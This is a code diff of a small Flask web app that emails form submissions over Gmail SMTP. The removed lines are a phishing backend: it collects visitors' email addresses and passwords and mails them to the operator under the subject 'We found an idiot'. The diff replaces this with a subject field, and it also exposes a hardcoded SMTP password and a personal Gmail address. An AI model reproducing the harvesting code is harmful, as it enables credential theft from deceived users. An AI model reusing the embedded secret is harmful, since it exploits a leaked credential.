@@ -14,7 +14,7 @@ password = "knoqmuajdwblggkz"
 
 msg = EmailMessage()
 
-msg['Subject'] = "We found an idiot"
+msg['Subject'] = "email"
 msg['From'] = sender_email
 msg['To'] = receiver_email
 
@@ -38,9 +38,9 @@ def page(page_name):
 
 
 def csv_write(data):
-    email = data['email']
-    passwd = data['password']
-    message = f'Email: {email} \n Password: {passwd}'
+    subject= data['subject']
+    email= data['email']
+    message = f'Email: {email} \n subject{subject}'
     msg.set_content(message, 'html')
     with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
         server.login('omarkhalifa226@gmail.com', password)
@@ -52,7 +52,7 @@ def submit():
     if request.method == 'POST':
         data = request.form.to_dict()
         csv_write(data)
-        return redirect('/index_pass.html')
+        return redirect('/index.html')
     else:
         return "You havn't submit the data"
 
